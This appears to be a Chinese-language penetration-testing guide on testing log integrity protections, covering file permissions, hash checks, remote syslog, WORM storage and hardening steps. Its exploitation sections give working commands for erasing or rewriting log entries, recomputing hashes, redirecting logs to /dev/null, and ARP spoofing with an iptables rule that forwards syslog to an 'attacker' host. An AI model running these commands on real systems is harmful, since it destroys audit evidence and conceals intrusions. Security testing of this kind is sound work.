# 日志完整性测试 (Log Integrity Testing)

---

## 第一部分：文档概述

### 1.1 编写目的
本文档旨在为渗透测试人员提供日志完整性保护机制测试的系统化方法论，帮助测试人员评估日志防篡改能力。

### 1.2 适用范围
本文档适用于以下场景：
- 日志文件完整性测试
- 日志哈希校验评估
- 日志签名机制测试
- 写一次读多次（WORM）存储测试

### 1.3 读者对象
- 渗透测试工程师
- 安全审计人员
- 合规性评估人员
- 安全架构师

---

## 第二部分：核心渗透技术专题

### 2.1 技术介绍

日志完整性测试是指评估日志系统在防止未授权修改、删除和篡改方面的能力，确保日志可作为可靠的取证证据。

**核心原理：**
- **文件权限保护**：通过文件系统权限防止未授权访问
- **哈希校验**：使用哈希值检测日志修改
- **数字签名**：使用数字签名确保日志完整性
- **WORM 存储**：使用写一次读多次存储防止修改
- **远程日志**：将日志发送到独立的远程服务器

### 2.2 测试常见于哪些业务场景

| **业务场景** | **功能示例** | **完整性要求** |
| :--- | :--- | :--- |
| **合规审计** | SOX、PCI DSS、HIPAA | 防篡改日志 |
| **安全事件** | 入侵检测、取证 | 完整证据链 |
| **金融交易** | 交易记录、审计 | 不可抵赖 |
| **医疗系统** | 患者记录访问 | HIPAA 合规 |
| **政府系统** | 敏感操作记录 | 法定要求 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**文件权限测试：**
```bash
# 检查日志文件权限
ls -la /var/log/

# 尝试读取日志
cat /var/log/application.log

# 尝试写入日志（如果有权限）
echo "Fake entry" >> /var/log/application.log

# 尝试删除日志
rm /var/log/application.log

# 尝试修改权限
chmod 777 /var/log/application.log
```

**哈希校验测试：**
```bash
# 检查是否有哈希文件
ls -la /var/log/*.sha256
ls -la /var/log/*.md5

# 验证哈希
sha256sum -c /var/log/application.log.sha256

# 尝试修改日志后验证
echo "Fake" >> /var/log/application.log
sha256sum -c /var/log/application.log.sha256
# 应该失败

# 检查哈希更新机制
# 哈希是否自动更新
```

**远程日志测试：**
```bash
# 检查是否配置远程日志
grep -r "remote" /etc/rsyslog.conf
grep -r "@@" /etc/rsyslog.d/

# 检查远程日志服务器
netstat -an | grep 514

# 尝试拦截远程日志
# 如果未加密，可窃听
tcpdump -i eth0 -n port 514
```

#### 2.3.2 白盒测试

**配置审计：**
```bash
# rsyslog 配置检查
cat /etc/rsyslog.conf

# 危险配置示例
# 1. 无远程日志
*.info;mail.none;authpriv.none    /var/log/messages

# 2. 日志权限过宽
$FileCreateMode 0644

# 3. 无哈希校验
# 应该配置：
# $ActionFileDefaultTemplate RSYSLOG_TraditionalFileFormat
# $ActionFileEnableSync on
```

```yaml
# 日志完整性配置示例
# 安全配置
logging:
  integrity:
    enabled: true
    hash_algorithm: sha256
    sign_logs: true
    remote_syslog:
      enabled: true
      host: syslog.internal
      port: 6514
      protocol: tls
    worm_storage:
      enabled: true
      retention_days: 365
```

### 2.4 漏洞利用方法

#### 2.4.1 日志文件篡改

```bash
# 如果有写权限
# 直接修改日志
sed -i 's/attacker_ip/127.0.0.1/g' /var/log/auth.log

# 删除特定条目
grep -v "suspicious_activity" /var/log/app.log > /tmp/clean.log
mv /tmp/clean.log /var/log/app.log

# 清空日志
echo "" > /var/log/application.log
```

#### 2.4.2 哈希校验绕过

```bash
# 如果哈希存储在同一位置
# 修改日志后重新计算哈希
echo "Fake entry" >> /var/log/app.log
sha256sum /var/log/app.log > /var/log/app.log.sha256

# 如果哈希密钥可获取
# 重新签名日志
```

#### 2.4.3 远程日志拦截

```bash
# 如果远程日志未加密
# ARP 欺骗拦截
arpspoof -i eth0 -t target gateway

# 转发日志到攻击者
iptables -t nat -A PREROUTING -p udp --dport 514 -j DNAT --to-destination attacker:514

# 或者被动窃听
tcpdump -i eth0 -n port 514 -w captured_logs.pcap
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过文件监控

```bash
# 如果系统监控日志文件修改
# 使用符号链接攻击
ln -sf /dev/null /var/log/application.log
# 日志写入被重定向到 /dev/null

# 或使用 truncate
truncate -s 0 /var/log/application.log
```

#### 2.5.2 时间窗口攻击

```bash
# 在日志轮转或备份时攻击
# 此时日志可能暂时 unprotected

# 监控日志文件
while true; do
    ls -l /var/log/application.log
    sleep 1
done

# 在轮转发生时快速修改
```

---

## 第三部分：附录

### 3.1 日志完整性检查清单

| **控制措施** | **检查方法** | **预期结果** | **状态** |
| :--- | :--- | :--- | :--- |
| 文件权限 | `ls -la /var/log/` | 640 或更严格 | ☐ |
| 文件所有者 | `ls -la /var/log/` | root:adm | ☐ |
| 哈希校验 | 检查哈希文件 | 存在且有效 | ☐ |
| 远程日志 | 检查配置 | 配置且加密 | ☐ |
| WORM 存储 | 检查存储配置 | 启用 | ☐ |
| 文件监控 | 检查监控工具 | 运行中 | ☐ |

### 3.2 日志完整性保护建议

```bash
# 1. 设置严格权限
chmod 640 /var/log/*.log
chown root:adm /var/log/*.log

# 2. 启用哈希校验
# 使用 logcheck 或类似工具
apt install logcheck

# 3. 配置远程日志
# /etc/rsyslog.conf
*.* @syslog.internal:6514

# 4. 启用文件监控
apt install aide
aide --init

# 5. 使用不可变标志（Linux）
chattr +a /var/log/auth.log
```

### 3.3 参考资源

- [NIST 800-92 Guide to Computer Security Log Management](https://csrc.nist.gov/publications/detail/sp/800-92/final)
- [PCI DSS Requirement 10 - Logging](https://docs-prv.pcisecuritystandards.org/PCI%20DSS/Standard/PCI-DSS-v4_0.pdf)
- [CIS Controls - Log Management](https://www.cisecurity.org/)
